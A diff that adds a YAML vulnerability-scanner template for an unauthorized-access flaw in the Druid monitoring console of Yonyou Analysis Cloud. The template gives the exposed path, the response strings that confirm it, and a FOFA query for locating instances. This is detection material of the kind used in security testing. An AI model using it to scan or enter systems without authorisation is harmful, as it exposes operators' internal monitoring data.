@@ -1,0 +1,15 @@
+id: poc-yaml-yonyou-analysis-cloud-druid-unauthorized-access
+info:
+  name: 用友分析云 druid 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 用友分析云
+  fofa: app="用友分析云"
+requests:
+- method: GET
+  path: /console/druid/index.html
+  expression: "status_code == 200 && \ncontains(body,\"Druid Stat Index\") &&\ncontains(body,\"\
+    View JSON API\") &&\ncontains(body,\"JavaVersion\")\n"
+variables: {}
+transport: http
